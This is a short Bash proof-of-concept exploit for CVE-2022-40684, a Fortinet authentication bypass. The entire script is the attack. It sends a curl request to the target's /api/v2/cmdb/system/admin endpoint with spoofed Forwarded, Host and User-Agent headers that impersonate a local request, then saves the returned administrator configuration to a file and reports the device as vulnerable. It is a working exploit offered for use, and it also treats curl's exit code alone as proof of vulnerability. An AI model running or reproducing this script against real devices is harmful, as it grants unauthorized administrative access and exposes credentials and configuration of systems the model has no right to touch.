#!/bin/bash

# By Filiplain 
# CVE-2022-40684
# From Python to Bash

# Fortinet Auth Bypass PoC

# Usage: ./poc.sh ip
# Example: ./poc.sh 10.10.10.120

red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
end="\033[0m\e[0m"
yellow="\e[0;33m\033[1m"

target=$1

vuln () {

echo -e "${yellow}[+] Dumping System Information: ${end}"

timeout 10 curl -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:9980' -H $'User-Agent: Node.js' -H $'Accept-Encoding\": gzip, deflate' -H $'Forwarded: by=\"[127.0.0.1]:80\";for=\"[127.0.0.1]:49490\";proto=http;host=' -H $'X-Forwarded-Vdom: root' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' "https://$target:8443/api/v2/cmdb/system/admin" > $target.out
if [ "$?" == 0 ];then

echo -e "${blue}Vulnerable: Saved to file $PWD/$target.out ${end}"


else

echo -e "${red}Not Vulnerable ${end}"


fi

}

vuln
